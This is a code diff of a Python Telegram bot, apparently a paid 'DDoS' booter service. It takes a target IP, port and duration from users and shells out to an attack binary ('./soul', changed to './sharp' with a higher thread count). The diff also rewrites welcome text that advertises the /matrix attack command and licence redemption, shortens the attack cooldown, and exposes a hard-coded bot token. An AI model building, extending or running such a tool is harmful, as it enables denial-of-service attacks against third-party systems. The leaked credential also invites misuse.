@@ -27,7 +27,7 @@ users_collection = db['VIP']
 redeem_codes_collection = db['redeem_codes0']
 
 TELEGRAM_BOT_TOKEN = '7565997354:AAGG8lnJ90dabXuhvrt8LdSLdxOXyJ6pBjM'
-ADMIN_USER_ID = 7519482969 , 7892337554
+ADMIN_USER_ID = 7519482969 
 
 cooldown_dict = {}
 user_attack_history = {}
@@ -65,10 +65,10 @@ async def start(update: Update, context: CallbackContext):
     user_id = update.effective_user.id  
     user_name = update.effective_user.first_name  
     if not await is_user_allowed(user_id):
-        await context.bot.send_message(chat_id=chat_id, text="*⚡️𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗕𝗘𝗔𝗦𝗧 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦 ☠️\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲:- {}\n🆔 𝗬𝗼𝘂𝗿 𝗜𝗗:- \n\n💎 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗦𝘁𝗮𝘁𝘂𝘀: inactive ❌\n\n🎮 𝗕𝗮𝘀𝗶𝗰 𝗖𝗼𝗺𝗺𝗮𝗻𝗱s\n• /attack - 𝗟𝗮𝘂𝗻𝗰𝗵 𝗔𝘁𝘁𝗮𝗰𝗸\n• /redeem - 𝗔𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗟𝗶𝗰𝗲𝗻𝘀𝗲\n\n💡 𝗡𝗲𝗲𝗱 𝗮 𝗸𝗲𝘆?\n𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘂𝗿 𝗔𝗱𝗺𝗶𝗻𝘀 𝗢𝗿 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀\n\n📢 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @BEAST_KINGDDOS*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*🏴‍☠️ Welcome to the Ultimate Attack Bot! ⚡\n💥 Use /matrix `<IP>:<port>:<duration>` to start an attack ☠️\n/redeem - active license*", parse_mode='Markdown')
         return
     message = (
-        f"*'⚡️𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗕𝗘𝗔𝗦𝗧 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦 ☠️\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲:- \n🆔 𝗬𝗼𝘂𝗿 𝗜𝗗:- \n💎 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗦𝘁𝗮𝘁𝘂𝘀: inactive ❌\n\n🎮 𝗕𝗮𝘀𝗶𝗰 𝗖𝗼𝗺𝗺𝗮𝗻𝗱s\n:• /attack - 𝗟𝗮𝘂𝗻𝗰𝗵 𝗔𝘁𝘁𝗮𝗰𝗸\n• /redeem - 𝗔𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗟𝗶𝗰𝗲𝗻𝘀𝗲\n\n💡 𝗡𝗲𝗲𝗱 𝗮 𝗸𝗲𝘆?\n𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘂𝗿 𝗔𝗱𝗺𝗶𝗻𝘀 𝗢𝗿 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀\n\n📢 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @BEAST_KINGDDOS\n━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        f"*'🏴‍☠️ Welcome to the Ultimate Attack Bot! ⚡\n💥 Use /matrix `<IP>:<port>:<duration>` to start an attack ☠️\n/redeem - active license"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
@@ -136,7 +136,7 @@ async def attack(update: Update, context: CallbackContext):
     if not ip.startswith(valid_ip_prefixes):
         await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid IP address! Please use an IP with a valid prefix.*", parse_mode='Markdown')
         return
-    cooldown_period = 120
+    cooldown_period = 60
     current_time = datetime.now()
     if user_id in cooldown_dict:
         time_diff = (current_time - cooldown_dict[user_id]).total_seconds()
@@ -174,7 +174,7 @@ async def papa_bol(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./soul {ip} {port} {duration} 100",
+            f"./sharp {ip} {port} {duration} 1000",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
